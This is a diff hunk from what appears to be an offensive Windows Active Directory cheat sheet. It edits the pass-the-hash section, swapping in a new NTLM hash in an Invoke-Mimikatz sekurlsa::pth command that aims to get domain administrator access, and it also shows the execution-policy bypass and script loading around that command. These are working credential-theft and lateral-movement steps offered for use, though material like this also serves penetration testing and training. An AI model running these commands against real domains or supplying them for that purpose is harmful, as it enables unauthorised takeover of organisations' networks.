@@ -194,7 +194,7 @@ To use domain admin's NTLM hash and get administrative access
 ---------------------------------------------------------------
 C:\> powershell -ep bypass
 C:\> . .\Invoke-Mimikatz.ps1
-C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:842750294802902c23u2i /run:powershell.exe"'
+C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'
 _______________________________________________________________________________________________________________________________________________________________________________________________
 Pass the ticket with powershell
 -------------------------------
